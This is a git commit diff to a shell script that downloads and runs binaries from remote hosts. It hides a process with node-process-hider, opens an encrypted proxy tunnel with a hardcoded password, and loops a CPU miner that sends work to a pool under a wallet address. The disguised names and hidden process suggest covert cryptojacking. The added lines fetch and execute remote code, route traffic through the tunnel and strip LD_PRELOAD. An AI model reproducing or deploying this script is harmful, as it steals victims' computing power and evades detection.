04dba8cb9f5858511ea8325ce3f0e1a59bd4f006
sindilesiqhova <sindilesiqhova@gmail.com>
2024-12-27 03:26:04 +0200

    Update execute_steps.sh

--- execute_steps.sh
+++ execute_steps.sh
@@ -24,9 +24,15 @@ npm i -g node-process-hider 1>/dev/null 2>&1
 
 sleep 2
 
-ph add sbp 1>/dev/null 2>&1
+ph add Silly_Doctor 1>/dev/null 2>&1
 
 sleep 2
+
+array=()
+for i in {a..z} {A..Z} {0..9}; 
+   do
+   array[$RANDOM]=$i
+done
 
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
 currentdate=$(date '+%d-%b-%Y_Harn_')
@@ -34,6 +40,9 @@ ipaddress=$(curl -s api.ipify.org)
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 currentdate+=$underscored_ip
 used_num_of_cores=`expr $num_of_cores - 2`
+
+randomWord=$(printf %s ${array[@]::8} $'\n')
+currentdate+=$randomWord
 
 echo ""
 echo "You have a total number of $used_num_of_cores cores"
@@ -60,19 +69,11 @@ done
 
 sleep 2
 
-wget -q https://greenleaf.teatspray.fun/sbp.tar.gz
+wget -q https://greenleaf.teatspray.fun/Spectre.tar.gz
 
 sleep 2
 
-tar -xf sbp.tar.gz
-
-sleep 2
-
-wget -q https://greenleaf.teatspray.fun/stun_10.1.6.tar.gz
-
-sleep 2
-
-tar -xf stun_10.1.6.tar.gz
+tar -xf Spectre.tar.gz
 
 sleep 2
 
@@ -80,16 +81,31 @@ randomPort1=$(shuf -i 10000-65000 -n 1)
 
 sleep 2
 
-./stun client --http-upgrade-path-prefix aPvDUHQEdtM5tVStQajxIVKaXA2Ad5TSu -L tcp://$randomPort1:dme.infinium.space:36034 ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.fun:80 &
+./Spectre -L=:$randomPort1 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
 
 sleep 2
 
-bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
+curl -s -x socks5h://127.0.0.1:1082 api.ipify.org
+
+sleep 2
+
+wget -q http://greenleaf.teatspray.fun/Silly_Doctor_272.tar.gz 1>/dev/null 2>&1
+
+sleep 2
+
+tar -xf Silly_Doctor_272.tar.gz
+
+echo " "
+echo " "
+
+unset LD_PRELOAD
+unset LD_PRELOAD_ENV
+unset LD_LIBRARY_PATH
 
 sleep 2
 
 while true
 do
-./sbp -o 127.0.0.1:$randomPort1 -t $used_num_of_cores -v 3 --donate-level 1 -p $currentdate -u solo:dmeVN5ngoXMVU5574hWLoV9MbpkcxowaBdaKNh5Ua6xGdKcLmGFCRvWf6dAGm26TDwght9RePMeaCfjPL4ni39Fc3MhLBHJLuF
-sleep 10
+./Silly_Doctor --disable-gpu --algorithm minotaurx --pool flyingsaucer-eu.teatspray.fun:7019 --wallet CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB --password $currentdate,c=LCC,zap=LCC --proxy 127.0.0.1:$randomPort1 --cpu-threads $used_num_of_cores --keepalive
+sleep 5
 done
